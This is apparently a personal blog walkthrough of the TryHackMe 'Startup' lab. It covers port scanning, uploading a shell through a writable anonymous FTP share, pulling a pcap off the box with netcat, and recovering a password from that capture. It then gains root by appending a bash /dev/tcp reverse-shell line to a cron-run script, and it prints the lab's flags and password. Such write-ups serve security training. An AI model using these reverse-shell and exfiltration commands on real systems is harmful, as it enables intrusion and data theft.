---
title: "Startup"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="startup.png" alt="startup" style="width: 200px;" >}}

## Enumeration


```bash
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.8.226.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAzds8QxN5Q2TsERsJ98huSiuasmToUDi9JYWVegfTMV4Fn7t6/2ENm/9uYblUv+pLBnYeGo3XQGV23foZIIVMlLaC6ulYwuDOxy6KtHauVMlPRvYQd77xSCUqcM1ov9d00Y2y5eb7S6E7zIQCGFhm/jj5ui6bcr6wAIYtfpJ8UXnlHg5f/mJgwwAteQoUtxVgQWPsmfcmWvhreJ0/BF0kZJqi6uJUfOZHoUm4woJ15UYioryT6ZIw/ORL6l/LXy2RlhySNWi6P9y8UXrgKdViIlNCun7Cz80Cfc16za/8cdlthD1czxm4m5hSVwYYQK3C7mDZ0/jung0/AJzl48X1
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOKJ0cuq3nTYxoHlMcS3xvNisI5sKawbZHhAamhgDZTM989wIUonhYU19Jty5+fUoJKbaPIEBeMmA32XhHy+Y+E=
|   256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnFr/4W5WTyh9XBSykso6eSO6tE0Aio3gWM8Zdsckwo
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
[Status: 200, Size: 808, Words: 136, Lines: 21]
files                   [Status: 301, Size: 312, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 808, Words: 136, Lines: 21]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

If ftp is open its worth checking
haha nice meme...now we know Maya is a cool person

{{< post-img src="important.jpg" alt="important.jpg" >}}

`notice.txt`

```text
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

same files are found in the `files` directory of website by the way

```bash
binwalk important.jpg

## DECIMAL HEXADECIMAL DESCRIPTION

0 0x0 PNG image, 735 x 458, 8-bit/color RGBA, non-interlaced
57 0x39 Zlib compressed data, compressed
```

Expected that

I go back to ftp folder and notice that i missed a hidden file
but it just says `'test'` so not useful

```bash
150 Here comes the directory listing.
drwxr-xr-x 3 65534 65534 4096 Nov 12 2020 .
drwxr-xr-x 3 65534 65534 4096 Nov 12 2020 ..
-rw-r--r-- 1 0 0 5 Nov 12 2020 .test.log
drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp
-rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg
-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt
226 Directory send OK.
```

But hey we have write permission on ftp folder
lol...As it's also accessible via website we can execute a shell
And we are already in

We have no permission to access lennie folder so I wander inside

As we start from `/` we get `recipe.txt`

```bash
www-data@startup:/$ cat recipe.txt
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

There is also an `incidents` folder

```bash
www-data@startup:/incidents$ ls
ls
suspicious.pcapng
```
we get that pcap file with netcat

```bash
nc 10.8.226.203 2311 < suspicious.pcapng //on remote
nc -lnvp 2311 > suspicious.pcapng // on local (listen to)
```

Mostly gibberish as expected (its supposed to be a job for wiireshark)

```bash
*ôe*ôe[sudo] password for www-data:         d       œ=:wé.ÞD   D               E  4@ @ÕÀšÀš\æ¿Çó/5²â @®  
*ôe*ôed      x       Ÿ=:cÑOW   W              E  G@ @ÁÀšÀš\æ¿Çó/5²â @®   
*ôl*ôec4ntg3t3n0ughsp1c3
 x      h       Ÿ=:FyÃOF   F               E  6%@ @gJÀšÀšæ\/5²â¿È @®  
*ôl*ôl
  h      d       Ÿ=:ŸÃOD   D               E  4@ @ÓÀšÀš\æ¿È/5²ä @®  
*ôl*ôld             Ÿ=:ÆOÞi   i             E  Y%@ @g&ÀšÀšæ\/5²ä¿È @®²  
*ôuà*ôlsudo: 3 incorrect password attempts
```

`c4ntg3t3n0ughsp1c3` looks like a password

let's find out...and it is!

we can switch user (su) or just ssh as lennie with the creds

`lennie : c4ntg3t3n0ughsp1c3`

FLag

```bash
$ cat user.txt
THM{not_enough_tartar_sauce}
```

There is also a scripts folder

```bash
$ cd scripts
$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Nov 12 2020 .
drwx------ 5 lennie lennie 4096 Nov 15 16:23 ..
-rwxr-xr-x 1 root root 77 Nov 12 2020 planner.sh
-rw-r--r-- 1 root root 1 Nov 15 16:26 startup_list.txt
```

Boy a sh script belonging to Root and we can execute it...but not write to it

```bash
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

the script refer to another one and I am pretty sure we can modify this one

```bash
$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
```

yup it belongs to lennie and we are lennie
it basically runs the print.sh just to say it is done?? XD
let's add a shell

`echo "bash -c 'exec bash -i &>/dev/tcp/10.8.226.203/2311 <&1'" >> print.sh`

maybe its a cron because I didnt even need to run `./planner.sh`

I was immediately root on my netcat listenner

```bash
root@startup:~# cat root.txt
cat root.txt
THM{add_schezuan_sauce}
```

I wonder who that pretty sus Maya is
Funny how the meme named important.jpg was not even remotely important
Merely a distraction
